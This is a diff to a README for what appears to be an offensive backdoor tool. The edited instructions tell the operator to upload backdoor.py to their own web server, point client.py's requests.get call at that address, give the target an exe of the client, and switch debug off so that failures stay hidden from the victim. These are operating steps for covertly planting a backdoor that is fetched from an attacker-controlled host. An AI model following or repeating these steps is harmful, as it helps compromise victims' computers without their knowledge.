@@ -57,7 +57,10 @@ If you want to plant also a backdoor give the user an exe version of the **clien
 
 Upload the file **backdoor.py** to a server that you do a GET request to and change the address in **client.py** from 
 `request = requests.get("http://webserver.com/backdoor.py")` to
-`request = requests.get("%YOUR WEB SERVER ADDRESS%")`
+`request = requests.get("%YOUR WEB SERVER ADDRESS%/backdoor.py")`
+
+Alse make sure that you change `debug = True` to `debug = False` when you give to the file to the client, 
+or else, if the request won't work, messages will be displayed (on the console) 
 
 Make sure that the target computer have python 3 installed and pip or else the backdoor won't be installed.
 ## how the backdoor works
